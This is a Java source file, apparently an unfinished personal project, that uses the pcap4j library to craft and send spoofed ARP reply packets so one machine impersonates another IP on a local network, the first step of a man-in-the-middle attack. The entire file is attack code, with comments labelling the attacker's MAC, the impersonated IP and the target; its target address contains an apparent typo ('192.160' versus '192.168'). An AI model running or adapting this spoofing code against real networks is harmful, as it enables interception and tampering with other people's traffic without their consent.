import org.pcap4j.core.*;
import org.pcap4j.packet.ArpPacket;
import org.pcap4j.packet.EthernetPacket;
import org.pcap4j.packet.Packet;
import org.pcap4j.packet.namednumber.ArpHardwareType;
import org.pcap4j.packet.namednumber.ArpOperation;
import org.pcap4j.packet.namednumber.EtherType;
import org.pcap4j.util.ByteArrays;
import org.pcap4j.util.MacAddress;
import org.pcap4j.util.NifSelector;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MITM{

    public static void main(String[] args) throws PcapNativeException, IOException, NotOpenException {
        //temporary fix to force pcap4j to use Npcap instead of wpcap
        System.setProperty("jna.library.path", "C:/Windows/System32/Npcap/");

        String[] s = new String[1];
        s[0] = "192.168.0.104";

        //SendArpRequestTemplate.run(s);

       // MacAddress resolved = ARP.resolveMacFromIP("192.168.0.104");

        //System.out.println("RESOLVED ADDRESS: " + resolved.getAddress().toString());

        MacAddress address = null;

        try{
            address = MacAddressResolver.resolveMacAddress(InetAddress.getByName("192.168.0.104"));
        } catch (Exception e) {
            e.printStackTrace();
        }

        System.out.println("MAC: " + address);

        PcapNetworkInterface networkInterface = MacAddressResolver.getAvailableNetworkInterface();
        String targetIP = "192.160.0.104";
        String sourceIPString = networkInterface.getAddresses().getFirst().getAddress().toString();

        //Attackers Mac Address
        MacAddress sourceMac = MacAddress.getByAddress(networkInterface.getLinkLayerAddresses().getFirst().getAddress());
        //TODO: we only want to target one device. do we do broadcast MAC?
        MacAddress destinationMac = address;

        //Impersonated IP
        InetAddress sourceIP = InetAddress.getByName("192.168.0.67");
        //targeted IP
        InetAddress destinationIP = InetAddress.getByName(targetIP);

        Packet spoofedPacket = arpHelper.createArpPacket(sourceIP, destinationIP, sourceMac, destinationMac, ArpOperation.REPLY);

        PcapHandle sendHandle = networkInterface.openLive(65536, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 10);

        sendHandle.sendPacket(spoofedPacket);
    }

    private static void sendSPoofedArp() throws PcapNativeException, UnknownHostException, NotOpenException {
        PcapNetworkInterface networkInterface = null;

        List<PcapNetworkInterface> networkInterfaces = Pcaps.findAllDevs();

        //Find the first available interface with a valid ipv4 address
        for (PcapNetworkInterface nInterface : networkInterfaces){
            for(PcapAddress address : nInterface.getAddresses()){

                //find our ipv4 address
                if(address instanceof PcapIpV4Address){

                    //we dont want our loopback address
                    if(address.getAddress().isLoopbackAddress()){
                        continue;
                    }

                    System.out.println("IP4 Address found:");
                    System.out.println(address.getAddress().getHostAddress());

                    networkInterface = nInterface;
                }
            }
        }

        if (networkInterface == null) {
            System.exit(1);
        }

        System.out.println(networkInterface.toString());

        //built based off sendarprequest sample https://github.com/kaitoy/pcap4j/blob/v1/pcap4j-sample/src/main/java/org/pcap4j/sample/SendArpRequest.java

        String targetIP = "192.160.0.104";
        String sourceIPString = networkInterface.getAddresses().getFirst().getAddress().toString();


        PcapHandle handle = networkInterface.openLive(65536, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 10);
        PcapHandle sendHandle = networkInterface.openLive(65536, PcapNetworkInterface.PromiscuousMode.PROMISCUOUS, 10);
        ExecutorService pool = Executors.newSingleThreadExecutor();

        //Attackers Mac Address
        MacAddress sourceMac = MacAddress.getByAddress(networkInterface.getLinkLayerAddresses().getFirst().getAddress());
        //TODO: we only want to target one device. do we do broadcast MAC?
        MacAddress destinationMac = MacAddress.getByName("00:00:00:00:00:00");

        //Impersonated IP
        InetAddress sourceIP = InetAddress.getByName("192.168.0.67");
        //targeted IP
        InetAddress destinationIP = InetAddress.getByName(targetIP);

        ArpPacket.Builder arpPacket = new ArpPacket.Builder();

        arpPacket
                .hardwareType(ArpHardwareType.ETHERNET)
                .protocolType(EtherType.IPV4)
                .hardwareAddrLength((byte) MacAddress.SIZE_IN_BYTES)
                .protocolAddrLength((byte) sourceIP.getAddress().length)
                .operation(ArpOperation.REPLY)
                .srcHardwareAddr(sourceMac)
                .srcProtocolAddr(sourceIP)
                .dstHardwareAddr(destinationMac)
                .dstProtocolAddr(destinationIP);

        EthernetPacket.Builder header = new EthernetPacket.Builder();

        header
                .dstAddr(destinationMac)
                .srcAddr(sourceMac)
                .type(EtherType.ARP)
                .payloadBuilder(arpPacket)
                .paddingAtBuild(true);

        Packet spoofedPacket = header.build();

        handle.sendPacket(spoofedPacket);
        handle.close();
    }
}